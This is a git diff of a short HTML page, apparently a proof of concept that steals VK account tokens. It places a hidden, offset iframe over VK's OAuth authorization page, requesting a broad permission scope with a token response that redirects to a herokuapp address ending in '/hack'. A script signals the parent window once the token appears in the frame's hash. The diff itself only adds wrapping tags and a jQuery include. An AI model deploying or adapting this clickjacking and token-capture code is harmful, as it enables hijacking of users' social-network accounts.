@@ -1,11 +1,18 @@
-<style>
-  .restricted{overflow-y: hidden; position: relative; top: -1159px;left:-16px;}
-</style>
-<script type="text/javascript">
-  checkFrame = function() {
-    if(frames[0].location.hash){
-      window.top.postMessage('fetched', "*");
+<html>
+<head>
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>
+</head>
+<body>
+  <style>
+    .restricted{overflow-y: hidden; position: relative; top: -1159px;left:-16px;}
+  </style>
+  <script type="text/javascript">
+    checkFrame = function() {
+      if(frames[0].location.hash){
+        window.top.postMessage('fetched', "*");
+      }
     }
-  }
-</script>
-<iframe sandbox="allow-same-origin allow-forms" onLoad="checkFrame()" src="https://oauth.vk.com/authorize?client_id=3396646&scope=1044479&response_type=token&redirect_uri=limitless-peak-1745.herokuapp.com/hack" width="120" height="1180" seamless class="restricted" scrolling="no"></iframe>
+  </script>
+  <iframe sandbox="allow-same-origin allow-forms" onLoad="checkFrame()" src="https://oauth.vk.com/authorize?client_id=3396646&scope=1044479&response_type=token&redirect_uri=limitless-peak-1745.herokuapp.com/hack" width="120" height="1180" seamless class="restricted" scrolling="no"></iframe>
+</body>
+</html>
